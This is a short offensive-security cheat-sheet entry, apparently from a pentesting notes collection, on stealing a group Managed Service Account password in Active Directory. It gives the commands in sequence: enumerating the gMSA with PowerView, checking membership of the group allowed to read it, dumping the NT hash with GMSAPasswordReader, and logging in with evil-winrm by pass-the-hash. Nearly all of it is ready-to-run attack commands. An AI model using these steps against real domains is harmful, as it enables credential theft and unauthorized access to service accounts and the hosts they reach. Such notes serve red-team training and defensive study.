---
title: gMSA Password Read
category: ad
subcategory: ad-attacks
os: windows
command: .\GMSAPasswordReader.exe --AccountName svc_apache
tools: GMSAPasswordReader, PowerView
---


### Identify gMSA accounts

```powershell
.\PowerView.ps1
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,PrincipalsAllowedToRetrieveManagedPassword
```

### Verify your group membership

```powershell
Get-ADGroupMember 'Web Admins'
```

### Read the gMSA password

```cmd
.\GMSAPasswordReader.exe --AccountName 'svc_apache'
```

### Login with the resulting NT hash

```bash
evil-winrm -i 192.168.81.165 -u svc_apache$ -H 4283B392D3647F3F26D614EE3AB9A80C
```
